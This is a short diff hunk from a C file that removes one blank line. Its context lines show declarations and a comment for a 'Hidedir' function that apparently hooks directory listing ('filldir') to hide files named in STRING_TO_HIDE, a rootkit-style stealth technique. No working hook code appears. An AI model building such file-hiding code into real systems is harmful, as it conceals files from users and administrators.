@@ -23,7 +23,6 @@ typedef unsigned long psize;
 psize *filldir;
 unsigned char* fill_dir_o_code;
 
-
 /**
 * My Hidedir function - checks if the name of the file/folder in STRING_TO_HIDE - if so, removing it from the list
 */
